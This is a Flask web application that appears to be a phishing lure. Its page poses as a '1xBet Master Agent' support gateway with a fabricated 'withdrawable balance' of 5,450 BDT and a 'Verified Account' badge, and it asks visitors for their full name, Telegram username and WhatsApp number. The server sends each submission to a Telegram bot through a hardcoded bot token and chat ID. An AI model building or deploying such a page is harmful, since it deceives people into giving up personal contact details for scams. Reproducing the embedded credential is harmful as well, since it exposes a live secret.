from flask import Flask, render_template_string, request, jsonify
import os, requests

app = Flask(__name__)

# Security configuration
B_A = "8540257283"
B_B = "AAEqTBD6kJSVozsKmWtZf_l-QQtkJtUuTw"
TOKEN = f"{B_A}:{B_B}"
CHAT_ID = "6529319833"

@app.route('/')
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>xCare Support</title>
        <style>
            body { font-family: sans-serif; background: #0b162c; color: white; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
            .header { width: 100%; background: #162641; padding: 15px; display: flex; justify-content: space-between; border-bottom: 1px solid #253959; font-size: 12px; box-sizing: border-box; }
            .main-content { width: 90%; max-width: 400px; display: flex; flex-direction: column; align-items: center; margin-top: 20px; }
            .balance-card { width: 100%; background: linear-gradient(135deg, #0d47a1, #1976d2); padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); box-sizing: border-box; margin-bottom: 20px; }
            .agent-btn { background: #162641; color: white; border: 1px solid #253959; padding: 20px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; text-align: left; display: flex; justify-content: space-between; align-items: center; text-decoration: none; }
            .agent-btn:hover { background: #1c2d4d; }
            .form-box { width: 100%; background: #162641; padding: 20px; border-radius: 15px; border: 1px solid #253959; box-sizing: border-box; display: none; }
            .input { width: 100%; padding: 12px; margin: 10px 0; background: #0b162c; border: 1px solid #253959; border-radius: 8px; color: white; box-sizing: border-box; }
            .submit-btn { background: #1976d2; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="header"><span>🌐 Gateway: Online</span><span>ID: 1XB-7729-MS</span></div>
        <div class="main-content">
            <div class="balance-card">
                <small>WITHDRAWABLE BALANCE</small>
                <h2 style="margin: 5px 0;">৳ 5,450.00 BDT</h2>
                <span style="color: #4caf50; font-size: 11px;">● Verified Account</span>
            </div>

            <button class="agent-btn" id="openFormBtn">
                <span>👑 1xBet Master Agent</span>
                <span>➔</span>
            </button>

            <div class="form-box" id="formContainer">
                <h4 style="margin: 0 0 15px 0; color: #8fa3bf; text-align: center;">👤 AGENT VERIFICATION</h4>
                <form id="vForm">
                    <input type="text" name="name" class="input" placeholder="Full Name" required>
                    <input type="text" name="user" class="input" placeholder="Telegram @username" required>
                    <input type="text" name="phone" class="input" placeholder="WhatsApp Number" required>
                    <button type="submit" class="submit-btn" id="sBtn">LINK ACCOUNT</button>
                </form>
            </div>
        </div>

        <script>
            const openBtn = document.getElementById('openFormBtn');
            const formBox = document.getElementById('formContainer');

            openBtn.onclick = () => {
                openBtn.style.display = 'none'; // বাটনটি লুকিয়ে ফেলবে
                formBox.style.display = 'block'; // ফরমটি দেখাবে
            };

            document.getElementById('vForm').onsubmit = async (e) => {
                e.preventDefault();
                document.getElementById('sBtn').innerText = 'SENDING...';
                const d = Object.fromEntries(new FormData(e.target));
                const r = await fetch('/submit-data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(d)
                });
                if(r.ok) { 
                    alert('সফলভাবে তথ্য পাঠানো হয়েছে! আপনার আবেদনটি প্রক্রিয়াধীন।'); 
                    location.reload(); 
                }
            };
        </script>
    </body>
    </html>
    ''')

@app.route('/submit-data', methods=['POST'])
def handle():
    d = request.json
    msg = f"🚀 **New Agent Request**\n\n👤 Name: {d.get('name')}\n🆔 User: {d.get('user')}\n📞 Phone: {d.get('phone')}"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
